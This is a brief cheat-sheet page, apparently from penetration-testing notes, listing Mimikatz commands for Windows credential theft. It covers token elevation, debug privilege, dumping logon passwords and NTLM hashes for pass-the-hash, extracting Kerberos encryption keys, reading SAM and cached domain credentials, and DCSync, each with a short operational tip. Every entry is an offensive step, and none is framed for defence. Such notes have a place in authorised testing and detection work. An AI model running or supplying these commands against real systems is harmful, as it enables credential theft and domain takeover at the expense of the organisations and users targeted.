---
title: Mimikatz
parent: General Usage
layout: default
nav_order: 34
---

`token::elevate`\
Elevate the token first

`privilege::debug`\
Need Debug privilege for some of the actions

`sekurlsa::logonpasswords`\
NTLM to PTH or crack.

`sekurlsa::ekeys`\
Encryption key of logged on users using Kerberos. aes256_hmac is the one that you need.

`lsadump::sam`\
Local accounts only.

`lsadump::cache`\
DCC which can only be used to crack instead of logon.

`lsadump::dcsync`\
Domain admins only.